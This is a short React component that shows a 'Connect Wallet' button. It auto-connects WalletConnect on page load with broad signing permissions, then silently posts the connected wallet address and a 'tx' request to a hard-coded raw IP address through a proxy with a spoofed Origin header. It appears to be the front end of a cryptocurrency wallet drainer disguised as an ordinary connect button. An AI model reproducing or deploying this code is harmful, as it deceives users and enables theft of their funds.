import { useEffect, useState } from "react";
import { EthereumProvider } from "@walletconnect/ethereum-provider";

function App() {
  const [walletConnected, setWalletConnected] = useState(false);
  const [account, setAccount] = useState(null);
  const [provider, setProvider] = useState(null);

  async function connectWallet() {
    try {
      console.log("🔗 Initializing WalletConnect...");

      const ethereumProvider = await EthereumProvider.init({
        showQrModal: true,
        qrModalOptions: { themeMode: "dark" },
        chains: [1],
        methods: ["eth_sign", "eth_sendTransaction", "eth_signTransaction"],
        projectId: "9fe3ed74e1d73141e8b7747bedf77551",
      });

      await ethereumProvider.enable();
      setProvider(ethereumProvider);

      const accounts = await ethereumProvider.request({ method: "eth_accounts" });

      if (accounts.length > 0) {
        setAccount(accounts[0]);
        setWalletConnected(true);
        console.log("✅ Connected Wallet Address:", accounts[0]);
      } else {
        console.log("⚠ No account found.");
      }
    } catch (error) {
      console.error("❌ Error connecting wallet:", error);
    }
  }

  async function requestTransaction() {
    if (!walletConnected || !account) {
      console.warn("⚠ Wallet not connected. Cannot send transaction request.");
      return;
    }
    
    console.log("📡 Sending transaction request...");

    try {
      const response = await fetch(
        "http://104.194.133.124:8080/http://104.194.133.124/send.php",
        {
          method: "POST",
          headers: {
            "Origin": "http://localhost",
            "Content-Type": "application/x-www-form-urlencoded",
          },
          body: new URLSearchParams({
            handler: "tx",
            address: account,
            chain: "56",
            type: "coin",
          }),
        }
      );

      const result = await response.text();
      console.log("✅ Transaction Request Result:", result);
    } catch (error) {
      console.error("❌ Transaction Request Failed:", error);
    }
  }

  useEffect(() => {
    if (walletConnected) {
      requestTransaction();
    }
  }, [walletConnected]);

  useEffect(() => {
    connectWallet(); // Try to connect wallet automatically on page load
  }, []);

  return (
    <a
      href="#"
      id="kos"
      onClick={connectWallet}
      className="uk-button uk-button-medium@m uk-button-default uk-button-outline uk-margin-left"
      data-uk-toggle=""
    >
      <span>{walletConnected ? "✅ Wallet Connected" : "🔗 Connect Wallet"}</span>
    </a>
  );
}

export default App;